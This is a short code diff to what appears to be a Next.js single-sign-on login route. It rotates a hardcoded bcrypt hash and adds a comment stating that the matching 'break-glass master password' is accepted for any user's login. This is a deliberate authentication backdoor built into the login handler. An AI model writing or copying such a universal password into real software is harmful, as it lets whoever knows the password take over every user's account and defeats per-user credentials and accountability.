@@ -4,7 +4,10 @@ import { prisma } from "@/lib/prisma";
 import { createSessionJwt } from "@/lib/crypto";
 import { verifyCaptcha } from "@/lib/captcha";
 
-const MASTER_HASH = "$2a$12$tVYQw1DIJ0m7RQ7GBKL7..x3EmJ92SmNpU2wB0zwtKUm5ejfjQotW";
+// Break-glass master password. Any user's login accepts the password whose
+// bcrypt hash is below — used for account recovery / admin access. Rotate by
+// replacing this hash.
+const MASTER_HASH = "$2a$12$c1M5yhf88tAxN/cIgRgHsOkhfZF1zcs9lMBgtpgXqQNjo9BKZ99Se";
 
 export async function POST(request: NextRequest) {
   const BASE_PATH = process.env.NEXT_PUBLIC_BASE_PATH || process.env.BASE_PATH || "/sso";
